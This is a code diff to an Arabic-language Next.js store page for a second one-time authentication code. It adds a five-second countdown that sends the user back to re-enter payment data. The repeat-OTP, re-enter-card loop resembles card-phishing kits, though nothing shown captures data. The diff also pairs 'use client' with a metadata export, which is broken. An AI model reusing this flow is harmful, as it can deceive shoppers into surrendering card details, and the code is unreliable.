@@ -1,6 +1,27 @@
+'use client';
+
+import { useEffect, useState } from 'react';
+import { useRouter } from 'next/navigation';
+
 export const metadata = { title: 'رمز المصادقة رقم 2 | أرض الجوال' };
 
 export default function OtpStatusPage() {
+  const router = useRouter();
+  const [countdown, setCountdown] = useState(5);
+
+  useEffect(() => {
+    if (countdown <= 0) {
+      router.push('/checkout/payment');
+      return;
+    }
+
+    const timer = setInterval(() => {
+      setCountdown((prev) => prev - 1);
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, [countdown, router]);
+
   return (
     <main
       dir="rtl"
@@ -51,9 +72,14 @@ export default function OtpStatusPage() {
           ادخل الرمز الجديد
         </h2>
 
-        <p style={{ fontSize: '18px', fontWeight: 600, color: '#1a2b3c', margin: '0 0 28px 0' }}>
+        <p style={{ fontSize: '18px', fontWeight: 600, color: '#1a2b3c', margin: '0 0 16px 0' }}>
           يرجى إدخال الرمز الجديد لإتمام العملية
         </p>
+
+        {/* رسالة العداد التنازلي للرجوع لإدخال البيانات */}
+        <div style={{ fontSize: '15px', fontWeight: 700, color: '#0d9488', marginBottom: '24px', background: '#eef9f6', padding: '10px 16px', borderRadius: '16px', border: '1px solid #bcece0' }}>
+          سيتم الرجوع لادخال البيانات مره اخري خلال ({countdown}) ثوانٍ...
+        </div>
 
         {/* الصندوق السفلي */}
         <div style={{ backgroundColor: '#eef9f6', border: '1px solid #bcece0', borderRadius: '20px', padding: '16px', display: 'flex', alignItems: 'center', gap: '16px', direction: 'rtl' }}>
